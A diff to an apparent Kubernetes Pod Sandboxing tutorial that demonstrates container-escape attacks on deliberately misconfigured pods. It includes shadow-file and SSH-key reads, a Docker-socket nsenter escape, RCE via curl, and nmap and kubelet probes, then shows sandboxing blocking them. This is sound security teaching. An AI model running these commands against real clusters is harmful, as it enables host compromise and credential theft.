@@ -121,6 +121,68 @@ Now we deploy resources with kubectl
 kubectl apply -f manifests/contoso-air-deployment.yaml
 ```
 
+To deploy the same Contoso Ship Manager application with Pod Sandboxing enabled, we need to modify the deployment to include the `runtimeClassName`. First, let's create a sandboxed version:
+
+```azurecli
+kubectl create deployment contoso-air-sandboxed \
+--image=mcr.microsoft.com/mslearn/samples/contoso-ship-manager \
+--port=3000 \
+--dry-run=client \
+--output yaml > manifests/contoso-air-sandboxed-deployment.yaml
+```
+
+Now edit the generated YAML file to add the Pod Sandboxing runtime class. The key addition is the `runtimeClassName: kata-mshv-vm-isolation` in the pod template spec:
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: contoso-air-sandboxed
+  labels:
+    app: contoso-air-sandboxed
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: contoso-air-sandboxed
+  template:
+    metadata:
+      labels:
+        app: contoso-air-sandboxed
+    spec:
+      runtimeClassName: kata-mshv-vm-isolation  # This enables Pod Sandboxing
+      containers:
+      - name: contoso-ship-manager
+        image: mcr.microsoft.com/mslearn/samples/contoso-ship-manager
+        ports:
+        - containerPort: 3000
+        resources:
+          requests:
+            memory: "128Mi"
+            cpu: "100m"
+          limits:
+            memory: "512Mi"
+            cpu: "500m"
+```
+
+Deploy the sandboxed version:
+
+```azurecli
+kubectl apply -f manifests/contoso-air-sandboxed-deployment.yaml
+```
+
+To verify both deployments are running, you can check the pods:
+
+```bash
+kubectl get pods -l app=contoso-air
+kubectl get pods -l app=contoso-air-sandboxed
+```
+
+You can also verify that the sandboxed pod is indeed using Kata containers by checking the runtime:
+
+```bash
+kubectl describe pod <sandboxed-pod-name> | grep "Runtime Class"
+```
 
 ## Introducing Common Vulnerabilities
 
@@ -170,9 +232,233 @@ public IActionResult Exec([FromBody] string cmd)
 }
 ```
 This simulates remote code execution (RCE) from a compromised container.
+## Demonstrating the impact of vulnerabilities
+
+Once the vulnerabilities are in place, we will now demonstrate how a bad actor might attempt to utilize these vulnerabilities on non-sandboxed pods.
+
+### Testing privileged container access
+
+First, let's exec into a privileged container and see what host resources we can access:
+
+```bash
+# Get the pod name
+kubectl get pods -l app=contoso-air
+
+# Exec into the privileged pod
+kubectl exec -it <pod-name> -- /bin/bash
+
+# Try to access host processes
+ps aux
+
+# Try to access host filesystem
+ls /host
+
+# Check if we can see other containers' processes
+cat /proc/1/cgroup
+```
+
+### Testing host path mount vulnerability
+
+With the host path mounted, we can access sensitive host files:
+
+```bash
+# From inside the container with host mount
+kubectl exec -it <pod-name> -- /bin/bash
+
+# Access host's sensitive files
+cat /host/etc/passwd
+cat /host/etc/shadow
+
+# Check for SSH keys
+ls -la /host/root/.ssh/
+
+# Look for kubernetes secrets
+find /host -name "*.key" -o -name "*.crt" 2>/dev/null
+```
+
+### Testing Docker socket exposure
+
+If the Docker socket is mounted, we can control other containers:
+
+```bash
+# From inside the container
+kubectl exec -it <pod-name> -- /bin/bash
+
+# Install docker client if not present
+apt-get update && apt-get install -y docker.io
+
+# List all containers on the host
+docker ps
+
+# Try to access other containers
+docker exec -it <other-container-id> /bin/bash
+
+# Create new containers with host privileges
+docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i sh
+```
+
+### Testing remote code execution
+
+Use the vulnerable API endpoint to execute commands:
+
+```bash
+# Port forward to access the application
+kubectl port-forward <pod-name> 8080:3000
+
+# In another terminal, exploit the RCE vulnerability
+curl -X POST http://localhost:8080/exec \
+  -H "Content-Type: application/json" \
+  -d '"cat /etc/passwd"'
+
+# Try to access other pods' network
+curl -X POST http://localhost:8080/exec \
+  -H "Content-Type: application/json" \
+  -d '"nmap -sn 10.244.0.0/16"'
+
+# Attempt to access Kubernetes API
+curl -X POST http://localhost:8080/exec \
+  -H "Content-Type: application/json" \
+  -d '"curl -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces"'
+```
+
+### Demonstrating lateral movement
+
+Show how an attacker might move between containers:
+
+```bash
+# From the compromised container, scan for other services
+kubectl exec -it <pod-name> -- /bin/bash
+
+# Network discovery
+nmap -sn 10.244.0.0/16
+
+# Try to access other pods' services
+curl http://<other-pod-ip>:8080
+
+# Attempt to access node's kubelet API
+curl -k https://<node-ip>:10250/pods
+```
+
+Let's now try the same exercise on sandboxed pods.
+
+## Deploying sandboxed pods with the same vulnerabilities
+
+Now let's deploy the same vulnerable application but with Pod Sandboxing enabled:
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: contoso-air-sandboxed
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: contoso-air-sandboxed
+  template:
+    metadata:
+      labels:
+        app: contoso-air-sandboxed
+    spec:
+      runtimeClassName: kata-mshv-vm-isolation
+      containers:
+      - name: contoso-air
+        image: mcr.microsoft.com/mslearn/samples/contoso-ship-manager
+        ports:
+        - containerPort: 3000
+        securityContext:
+          privileged: true  # Same vulnerability
+        volumeMounts:
+        - name: host-root
+          mountPath: /host  # Same host mount
+        - name: docker-socket
+          mountPath: /var/run/docker.sock  # Same docker socket
+      volumes:
+      - name: host-root
+        hostPath:
+          path: /
+      - name: docker-socket
+        hostPath:
+          path: /var/run/docker.sock
+```
+
+Deploy the sandboxed version:
+
+```bash
+kubectl apply -f manifests/contoso-air-sandboxed-deployment.yaml
+```
+
+## Testing the same vulnerabilities on sandboxed pods
+
+Now let's repeat the same attacks and observe how Pod Sandboxing protects against them:
+
+### Testing privileged access (BLOCKED)
+
+```bash
+# Get the sandboxed pod name
+kubectl get pods -l app=contoso-air-sandboxed
+
+# Exec into the sandboxed pod
+kubectl exec -it <sandboxed-pod-name> -- /bin/bash
+
+# Try to access host processes - you'll see only VM processes
+ps aux
+
+# The host filesystem mount will be empty or restricted
+ls /host
+```
+
+### Testing host path access (BLOCKED)
+
+```bash
+# From inside the sandboxed container
+kubectl exec -it <sandboxed-pod-name> -- /bin/bash
+
+# Host files are not accessible - you're in a VM
+cat /host/etc/passwd  # This will fail or show VM's passwd
+find /host -name "*.key" 2>/dev/null  # No host keys visible
+```
+
+### Testing Docker socket access (BLOCKED)
+
+```bash
+# From inside the sandboxed container
+kubectl exec -it <sandboxed-pod-name> -- /bin/bash
+
+# Docker socket is not accessible from within the VM
+ls -la /var/run/docker.sock  # File doesn't exist or is not functional
+docker ps  # Command will fail - no docker daemon access
+```
+
+### Testing network isolation
+
+```bash
+# Network scanning from sandboxed pod shows limited scope
+kubectl exec -it <sandboxed-pod-name> -- /bin/bash
+
+# Network discovery is limited to the VM's network view
+nmap -sn 10.244.0.0/16  # Limited or no results
+
+# Cannot access node's kubelet API directly
+curl -k https://<node-ip>:10250/pods  # This will fail
+```
+
+### Comparing attack surfaces
+
+Create a side-by-side comparison:
+
+```bash
+# Test from regular pod
+kubectl exec -it <regular-pod> -- ps aux | wc -l
+
+# Test from sandboxed pod  
+kubectl exec -it <sandboxed-pod> -- ps aux | wc -l
+
+# Regular pod can see many host processes, sandboxed pod sees only VM processes
+```
 
 
-Once the vulnerabilities are in place, we will now demonstrate:
+You will notice here that:
 
 - Host mounts fail
 - Privileged mode is blocked
